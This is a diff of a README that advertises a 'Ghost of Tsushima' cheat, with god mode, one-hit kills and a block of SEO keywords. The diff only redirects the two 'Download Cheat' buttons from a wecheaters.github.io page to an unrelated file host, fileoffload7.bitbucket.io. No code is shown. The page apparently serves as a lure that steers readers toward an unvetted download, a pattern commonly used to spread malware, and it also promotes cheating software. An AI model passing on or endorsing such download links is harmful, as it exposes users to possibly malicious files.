@@ -4,7 +4,7 @@
 
 Whether you're focused on perfect duels, open-world dominance, or stealth mastery — these cheats turn Tsushima into your personal battlefield.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/ghost-of-tsushima/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🧠 What Is a Ghost of Tsushima Cheat?
@@ -21,7 +21,7 @@ These cheats let you:
 
 🎮 Think of it as unlocking a hidden “dev mode” for full control.
 
-[![Download Cheat](https://i.playground.ru/e/fPoXk2HlQmfOdBB9xTi1Aw.webp)](https://wecheaters.github.io/cheats/ghost-of-tsushima/)
+[![Download Cheat](https://i.playground.ru/e/fPoXk2HlQmfOdBB9xTi1Aw.webp)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🔥 Top Ghost of Tsushima Cheat Features
@@ -107,3 +107,4 @@ ghost of tsushima cheat, god mode tsushima, one hit kill mod, ghost of tsushima 
 
 **Write your legend your way.**
 With a **Ghost of Tsushima cheat**, you're not just a warrior — you're the Ghost unleashed. ⚔️👻🔥
+
